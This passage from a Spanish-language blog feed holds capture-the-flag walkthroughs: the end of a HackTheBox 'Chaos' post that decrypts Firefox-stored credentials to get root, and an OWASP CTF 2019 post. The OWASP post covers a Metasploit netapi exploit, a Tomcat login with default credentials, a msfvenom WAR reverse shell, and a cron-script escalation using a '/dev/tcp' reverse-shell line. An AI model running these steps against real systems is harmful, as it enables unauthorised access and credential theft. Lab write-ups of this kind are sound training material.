&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/chaos/Screenshot_20190523_152619.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-json&#34; data-lang=&#34;json&#34;&gt;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
   &lt;span class=&#34;nt&#34;&gt;&amp;#34;nextId&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
   &lt;span class=&#34;nt&#34;&gt;&amp;#34;logins&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:[&lt;/span&gt;
      &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
         &lt;span class=&#34;nt&#34;&gt;&amp;#34;id&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
         &lt;span class=&#34;nt&#34;&gt;&amp;#34;hostname&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;https://chaos.htb:10000&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
         &lt;span class=&#34;nt&#34;&gt;&amp;#34;httpRealm&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;kc&#34;&gt;null&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
         &lt;span class=&#34;nt&#34;&gt;&amp;#34;formSubmitURL&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;https://chaos.htb:10000&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
         &lt;span class=&#34;nt&#34;&gt;&amp;#34;usernameField&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;user&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
         &lt;span class=&#34;nt&#34;&gt;&amp;#34;passwordField&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;pass&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
         &lt;span class=&#34;nt&#34;&gt;&amp;#34;encryptedUsername&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;MDIEEPgAAAAAAAAAAAAAAAAAAAEwFAYIKoZIhvcNAwcECDSAazrlUMZFBAhbsMDAlL9iaw==&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
         &lt;span class=&#34;nt&#34;&gt;&amp;#34;encryptedPassword&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;MDoEEPgAAAAAAAAAAAAAAAAAAAEwFAYIKoZIhvcNAwcECNx7bW1TuuCuBBAP8YwnxCZH0+pLo6cJJxnb&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
         &lt;span class=&#34;nt&#34;&gt;&amp;#34;guid&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;{cb6cd202-0ff8-4de5-85df-e0b8a0f18778}&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
         &lt;span class=&#34;nt&#34;&gt;&amp;#34;encType&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
         &lt;span class=&#34;nt&#34;&gt;&amp;#34;timeCreated&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1540642202692&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
         &lt;span class=&#34;nt&#34;&gt;&amp;#34;timeLastUsed&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1540642202692&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
         &lt;span class=&#34;nt&#34;&gt;&amp;#34;timePasswordChanged&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1540642202692&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
         &lt;span class=&#34;nt&#34;&gt;&amp;#34;timesUsed&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;
      &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
   &lt;span class=&#34;p&#34;&gt;],&lt;/span&gt;
   &lt;span class=&#34;nt&#34;&gt;&amp;#34;disabledHosts&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:[&lt;/span&gt;

   &lt;span class=&#34;p&#34;&gt;],&lt;/span&gt;
   &lt;span class=&#34;nt&#34;&gt;&amp;#34;version&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;2&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Para poder obtener el usuario y contraseña de este archivo utilizamos firefox_decrypt [https://github.com/unode/firefox_decrypt], lo descargamos en la maquina y lo ejecutamos, al ejecutarlo nos pide la contraseña para el usuario &lt;code&gt;ayush&lt;/code&gt; la ingresamos (&lt;code&gt;jiujitsu&lt;/code&gt;), luego de eso nos muestra el usuario y contraseña en ese archivo.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/chaos/Screenshot_20190523_153148.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-vim&#34; data-lang=&#34;vim&#34;&gt;&lt;span class=&#34;nx&#34;&gt;Website&lt;/span&gt;:   &lt;span class=&#34;nx&#34;&gt;https&lt;/span&gt;:&lt;span class=&#34;sr&#34;&gt;//&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;chaos&lt;/span&gt;.&lt;span class=&#34;nx&#34;&gt;htb&lt;/span&gt;:&lt;span class=&#34;m&#34;&gt;10000&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;Username&lt;/span&gt;: &lt;span class=&#34;s1&#34;&gt;&amp;#39;root&amp;#39;&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;Password&lt;/span&gt;: &lt;span class=&#34;s1&#34;&gt;&amp;#39;Thiv8wrej~&amp;#39;&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Escalamos con el usuario &lt;code&gt;root&lt;/code&gt; y contraseña, obteniendo privilegios root y nuestra bandera &lt;code&gt;root.txt&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/chaos/Screenshot_20190523_153328_root.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
</content:encoded>
        <dc:creator>sckull</dc:creator>
        <media:content url="https://sckull.github.io/images/posts/htb/chaos/cover.webp" medium="image"><media:title type="html">featured image</media:title></media:content>
        
        <media:content url="https://sckull.github.io/images/posts/htb/chaos/cover.webp" medium="image"><media:title type="html">meta image</media:title></media:content>
        
          
            
              <category>linux</category>
            
          
        
        
          
            
              <category>hackthebox</category>
            
          
        
        
      </item>
      
      <item>
        <title>OWASP CTF 2019 Guatemala - Infraestructura</title>
        <link>https://sckull.github.io/posts/owaspinfra/</link>
        <pubDate>Sun, 19 May 2019 00:00:00 +0000</pubDate>
        
        <atom:modified>Sun, 19 May 2019 00:00:00 +0000</atom:modified>
        <guid>https://sckull.github.io/posts/owaspinfra/</guid>
        <description>OWASP CTF es una maquina del OWASP Guatemala, aqui encontrarás la solucion para obtener la flag user.txt y root.</description>
        <content:encoded>&lt;p&gt;OWASP CTF es una maquina del OWASP Guatemala, aqui encontrarás la solucion para obtener la flag user.txt y root.txt de las diferentes maquinas presentadas por los organizadores.&lt;/p&gt;




  



  &lt;div class=&#34;featured-image__wrapper&#34;&gt;
    &lt;img src=&#34;https://sckull.github.io/images/posts/owasp/cover.webp&#34; alt=&#34;featured image&#34; class=&#34;featured-image&#34; style=&#34;width: ;height: ;&#34;&gt;
  &lt;/div&gt;

&lt;br&gt;
&lt;hr /&gt;
&lt;h2 id=&#34;infraestructura-1&#34;&gt;INFRAESTRUCTURA 1&lt;/h2&gt;
&lt;h3 id=&#34;nmap&#34;&gt;NMAP&lt;/h3&gt;
&lt;p&gt;Escaneo de puertos/version/sistema operativo con nmap&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;Starting Nmap 7.70 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; at 2019-05-16 02:46 CDT
Nmap scan report &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; 192.168.1.15
Host is up &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0.00094s latency&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.
Not shown: &lt;span class=&#34;m&#34;&gt;997&lt;/span&gt; closed ports
PORT    STATE SERVICE      VERSION
135/tcp open  msrpc        Microsoft Windows RPC
139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds Microsoft Windows XP microsoft-ds
MAC Address: 00:0C:29:87:DA:AB &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;VMware&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
Device type: general purpose
Running: Microsoft Windows XP
OS CPE: cpe:/o:microsoft:windows_xp::sp2 cpe:/o:microsoft:windows_xp::sp3
OS details: Microsoft Windows XP SP2 or SP3
Network Distance: &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; hop
Service Info: OSs: Windows, Windows XP&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_xp

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap &lt;span class=&#34;k&#34;&gt;done&lt;/span&gt;: &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; IP address &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; host up&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; scanned in 9.89 seconds
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h3 id=&#34;metasploit&#34;&gt;METASPLOIT&lt;/h3&gt;
&lt;p&gt;Utilizamos el exploit netapi para windows xp contra el sistema operativo.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/owaspinfra/Screenshot_20190521_014519.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h3 id=&#34;shell&#34;&gt;SHELL&lt;/h3&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/owaspinfra/netapi_ez.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Obtenemos permisos de administrador y nuestra flag en el Escritorio.&lt;/p&gt;
&lt;p&gt;&lt;code&gt;flag.txt: flag{w1nd0ws_n3tap1_3xplo1t}&lt;/code&gt;&lt;/p&gt;
&lt;hr /&gt;
&lt;h2 id=&#34;infraestructura-2&#34;&gt;INFRAESTRUCTURA 2&lt;/h2&gt;
&lt;h3 id=&#34;nmap-1&#34;&gt;NMAP&lt;/h3&gt;
&lt;p&gt;Escaneo de puertos tcp/version/sistema con nmap.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;Starting Nmap 7.70 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; at 2019-05-16 03:54 CDT
Nmap scan report &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; 192.168.1.14
Host is up &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0.00088s latency&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.
Not shown: &lt;span class=&#34;m&#34;&gt;998&lt;/span&gt; closed ports
PORT     STATE SERVICE VERSION
8009/tcp open  ajp13   Apache Jserv &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Protocol v1.3&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; ajp-methods: 
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_  Supported methods: GET HEAD POST OPTIONS
8080/tcp open  http    Apache Tomcat 9.0.10
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_http-favicon: Apache Tomcat
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_http-title: Apache Tomcat/9.0.10
MAC Address: 00:0C:29:AB:85:8F &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;VMware&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
Device type: general purpose
Running: Linux 3.X&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
Network Distance: &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; hop

TRACEROUTE
HOP RTT     ADDRESS
&lt;span class=&#34;m&#34;&gt;1&lt;/span&gt;   0.88 ms 192.168.1.14

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap &lt;span class=&#34;k&#34;&gt;done&lt;/span&gt;: &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; IP address &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; host up&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; scanned in 9.26 seconds.
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h3 id=&#34;puerto-8009&#34;&gt;Puerto 8009&lt;/h3&gt;
&lt;p&gt;Nos muestra un error de conexion.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/htb/owaspinfra/Screenshot_20190521_005910.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h3 id=&#34;http&#34;&gt;HTTP&lt;/h3&gt;
&lt;p&gt;En el puerto 8080 nos muestra una pagina corriendo en tomcat.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/htb/owaspinfra/Screenshot_20190521_005546.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Utilizamos el panel de control para obtener acceso. Siempre probamos las contraseñas comunes o por default de alguna plataforma para ver si logramos obtener accesso, este es el caso de esta maquina.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;user: tomcat
pass: s3cret
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Ahora tenemos acceso al panel de control de tomcat, podemos subir una shell/payload con extension war.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/htb/owaspinfra/Screenshot_20190521_010417.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Creamos nuestra reverse shell o payload con msfvenom y configuramos metasploit para poder obtener una sesion o shell por medio del payload.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/htb/owaspinfra/Screenshot_20190521_011331.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Subimos nuestro archivo en el panel de control en a parte de &amp;lsquo;WAR file to deploy&amp;rsquo;.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/htb/owaspinfra/Screenshot_20190521_011534.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Para ejecutar nuestra shell solo buscamos en la lista que nos aparece por encima y basta con darle click para que se habra una sesion en metasploit.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/htb/owaspinfra/Screenshot_20190521_011725.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h4 id=&#34;metasploit-1&#34;&gt;Metasploit&lt;/h4&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/owaspinfra/intra_sesion.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Actualizamos nuestra shell con &lt;code&gt;python3&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/owaspinfra/Screenshot_20190521_012235.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Estando dentro obtenemos nuestra bandera en la carpeta principal del usuario retoinfra1.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/owaspinfra/Screenshot_20190521_012322.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;user.txt:flag{t0mcat_fa1_cr3dent1als}&lt;/code&gt;&lt;/p&gt;
&lt;h3 id=&#34;privilege-escalation&#34;&gt;PRIVILEGE ESCALATION&lt;/h3&gt;
&lt;p&gt;Utilizndo pspy encontramos un cronjob que se ejecuta cada minuto y ejecuta un archivo sh en &lt;code&gt;/home/retoinfra1/script.sh&lt;/code&gt;.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/htb/owaspinfra/intra3_cron.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Ya que podemos editar el archivo y se ejecuta cada minuto vamos a modificar el script.sh para obtener una shell inversa, agregamos una linea de comando que nos permite obtener una shell inversa.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;nb&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;bash -i &amp;gt;&amp;amp; /dev/tcp/192.168.1.10/7878 0&amp;gt;&amp;amp;1&amp;#34;&lt;/span&gt; &amp;gt;&amp;gt; script.sh
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Ponemos a la escucha nuestro puerto en netcat, esperamos y obtenemos nuestra shell inversa como usuario root.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/owaspinfra/intra3_finalroot.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;root.txt:flag{cr0n_fa1l_bash_scr1pt}&lt;/code&gt;&lt;/p&gt;
&lt;hr /&gt;
&lt;h2 id=&#34;infraestructura-3&#34;&gt;INFRAESTRUCTURA 3&lt;/h2&gt;
&lt;h3 id=&#34;nmap-2&#34;&gt;NMAP&lt;/h3&gt;
&lt;p&gt;Escaneo de puertos tcp con nmap.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
